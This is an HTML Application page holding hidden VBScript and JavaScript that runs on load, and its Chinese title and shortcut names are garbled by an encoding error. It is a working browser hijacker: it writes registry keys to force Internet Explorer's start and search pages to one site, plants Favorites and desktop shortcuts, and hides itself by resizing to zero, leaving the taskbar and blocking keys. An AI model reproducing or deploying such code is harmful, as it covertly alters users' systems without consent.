   <html>
   <title>ÉèÎªÊ×Ò³</title>
   <head>
   <object id='bugs' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
   <object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
   <script LANGUAGE="VBScript">
   Public sucess
   sucess = 0

   Function SetREG()
       On Error Resume Next
       bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.zhao114.com.cn"
       bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.zhao114.com.cn"
       bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page", "http://www.zhao114.com.cn"
       bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\default_page_url", "http://www.zhao114.com.cn"
       bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url1","http://www.zhao114.com.cn"
       bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url2","http://www.zhao114.com.cn"
       bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url3","http://www.zhao114.com.cn"
       bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\First Home Page","http://www.zhao114.com.cn"
       If err.number<>0 Then
           setreg = false
       Else
           setreg = true
       End If
   End Function

   Function AddFav(N, U)
       On Error Resume Next
       Set S = wsh.CreateShortcut(wsh.SpecialFolders("Favorites") + "/" + N +".URL")
       S.TargetPath = U
       S.Save()
       Set Sl = wsh.CreateShortcut(wsh.SpecialFolders("Favorites") + "/Á´½Ó/" + N +".URL")
       Sl.TargetPath = U
       Sl.Save()
       If err.number<>0 Then
           AddFav = false
       Else
           AddFav = true
       End If
   End Function

   Function AddDesktop(N, U)
       on error resume next
       Set S = wsh.CreateShortcut(wsh.SpecialFolders("AllUsersDesktop") + "/" + N +".URL")
       S.TargetPath = U
       S.Save()
       If err.number<>0 Then
           AddDesktop = false
       Else
           AddDesktop = true
       End If
   End Function

   Sub FF()
       If AddFav("¡ô¡ô´ò¿ªÒ»Æ¬Ôµ·ÖµÄÌì¿Õ¡ô¡ô","http://www.zhao114.com.cn")=true And AddFav("¡ô¡ô¾«²ÊÉÏÍøµ¼º½¡ô¡ô","http://www.zhao114.com.cn")=true And AddDesktop("¡ô×î¿ìµÄÉÏÍøµ¼º½¡ô","http://www.zhao114.com.cn") = True And setreg()=true Then
           sucess=0
           window.close()
       End If
   End Sub
   </script>

   <SCRIPT language=JavaScript>
   function F()
   {
     FF();
     if (sucess==0) setTimeout("F()", 2000);
   }
   setTimeout("F()", 2000);
   parent.moveTo((screen.width-0)/2,(screen.height-0)/2);
   parent.resizeTo(0,0);
   </SCRIPT>
   </head>
   <HTA:APPLICATION   caption="no" border="none"
                    SHOWINTASKBAR="no">
   <body bgcolor="#ffffff" text="#000000" scroll="no" leftmargin="2"  topmargin="3" marginwidth="0" marginheight="0" oncontextmenu='self.event.returnvalue=0' onkeydown="javascript:if(event.keyCode==27 || event.keyCode==78 && event.ctrlKey)return false;">
   </body>
   </HTML>
